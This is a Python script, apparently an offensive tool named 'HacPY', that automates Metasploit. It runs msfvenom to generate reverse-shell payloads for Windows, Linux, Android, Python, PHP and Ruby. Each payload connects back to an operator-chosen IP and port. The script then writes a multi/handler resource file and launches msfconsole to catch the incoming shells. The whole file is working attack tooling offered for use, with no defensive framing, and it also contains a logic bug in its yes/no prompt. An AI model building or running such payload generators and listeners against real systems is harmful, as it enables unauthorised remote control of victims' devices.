import os
import re
import subprocess
import sys
import keyboard
ask=("\033[31m[?]\033[0m")
q=("\033[31m[x]\033[0m")
t=("\033[31m[T]\033[0m")
e=("\033[31m[!]\033[0m")
window=("windows/meterpreter/reverse_tcp")
linux=("linux/meterpreter/reverse_tcp")
Andro=("android/meterpreter/reverse_tcp")
py=("python/meterpreter/reverse_tcp")
php=("php/meterpreter/reverse_tcp")
ruby=("ruby/shell_reverse_tcp")
win=(".exe")
lin=(".elf")
andr=(".apk")
ph=(".py")
p=(".php")
rub=(".rb")

def check_root():
    return os.geteuid() == 0

if check_root():
    pass
else:
    print(f'{e} Enter As Root')
    sys.exit()

def is_valid_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    return re.match(pattern, ip) is not None

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def payload():
    print("[1] Windows\n[2] Linux\n[3] Android\n[4] Python\n[5] Php\n[6] Ruby")
    while True:
        try:
            opt=int(input(">>> "))
            break
        except ValueError:
            print(f'{q} Invalid Choise')
    if opt==1:
        print(f'{t} Using Payload {window}')
        pay=(window)
        form=(win)
    elif opt==2:
        print(f'{t} Using Payload {linux}')
        pay=(linux)
        form=(lin)
    elif opt==3:
        print(f'{t} Using Payload {Andro}')
        pay=(Andro)
        form=(andr)
    elif opt==4:
        print(f'{t} Using Payload {py}')
        pay=(py)
        form=(ph)
    elif opt==5:
        print(f'{t} Using Payload {php}')
        pay=(php)
        form=(p)
    elif opt==6:
        print(f'{t} Using Payload {ruby}')
        pay=(ruby)
        form=(rub)

    while True:
        ip = input(f'{ask} Enter IP Address: ')

        if is_valid_ip(ip):
            break
        else:
            print(f'{q} Invalid IP...')

    while True:
        try:
            port = int(input(f'{ask} Enter Port: '))

            if len(str(port)) <= 6:
                break
            else:
                print(f'{q} Invalid Port ...')
        except ValueError:
                print(f'{q} Invalid Port ...')
    
    name = input(f'{ask} Enter File Name:')
    Payload = (f'msfvenom -p {pay} LHOST={ip} LPORT={port} > {name}{form}')

    completed_process = subprocess.run(
    Payload, shell=True, text=True, capture_output=True)

    print(completed_process.stdout)
    print(completed_process.stderr)

    print("----Payload Generated----")

def listn():
    print("[1] Windows\n[2] Linux\n[3] Android\n[4] Python\n[5] Php\n[6] Ruby")
    while True:
        try:
            opt=int(input(">>> "))
            break
        except ValueError:
            print(f'{q} Invalid Choise')
    if opt==1:
        print(f'{t} Using Payload {window}')
        pay=(window)
    elif opt==2:
        print(f'{t} Using Payload {linux}')
        pay=(linux)
    elif opt==3:
        print(f'{t} Using Payload {Andro}')
        pay=(Andro)
    elif opt==4:
        print(f'{t} Using Payload {py}')
        pay=(py)
    elif opt==5:
        print(f'{t} Using Payload {php}')
        pay=(php)
    elif opt==6:
        print(f'{t} Using Payload {ruby}')
        pay=(ruby)


    while True:
        lip = input(f'{ask} Enter IP Address: ')

        if is_valid_ip(lip):
            break
        else:
            print(f'{q} Invalid IP.')

    while True:
        try:
            lport = int(input(f'{ask} Enter Port Number: '))

            if len(str(lport)) <= 6:
                break
            else:
                print(f'{q} Invalid Port.')
        except ValueError:
            print(f'{q} Invalid Port.')

    scr = (f'use exploit/multi/handler\nset payload {pay}\nset lhost {lip}\nset lport {lport}\nrun -j')
    with open("msf.rc", "w") as file:
        file.write(scr)

    command_to_run = "msfconsole -r msf.rc"

    subprocess.run(["gnome-terminal", "--title", "HacPY", "--", "bash",
               "-c", f"{command_to_run}; read -p '>>> Press Enter to exit...'"])

    exit_key = "esc"

    print(f"{e} Press '{exit_key}' To Exit...")
    keyboard.wait(exit_key)

    print(">>> Bye...")


clear_terminal()


print('')

print('''\033[32m   ▄█    █▄       ▄████████  ▄████████    ▄███████▄ ▄██   ▄   
  ███    ███     ███    ███ ███    ███   ███    ███ ███   ██▄ 
  ███    ███     ███    ███ ███    █▀    ███    ███ ███▄▄▄███
 ▄███▄▄▄▄███▄▄   ███    ███ ███          ███    ███ ▀▀▀▀▀▀███ 
▀▀███▀▀▀▀███▀  ▀███████████ ███        ▀█████████▀  ▄██   ███ 
  ███    ███     ███    ███ ███    █▄    ███        ███   ███ 
  ███    ███     ███    ███ ███    ███   ███        ███   ███ 
  ███    █▀      ███    █▀  ████████▀   ▄████▀       ▀█████▀  
                                                              \033[0m''')
print("                                                 By Z1L0X")
print("")
print("")

print(">>> Choose An Option: ")
print('')
print("[1] Create A Payload\n[2] Start Listener")
print('')

while True:
    try:
        cho=int(input(">>> "))
        break
    except ValueError:
        print(f'{q} Invalid Choise')

if cho==1:
    payload()
    lo=input(f'{ask} Do You Wanna Start Listner(Y/N): ')
    if lo=="y"or "Y":
        listn()
    elif lo=="n" or "N":
        print(f'As You Wish...')
if cho==2:
    listn()
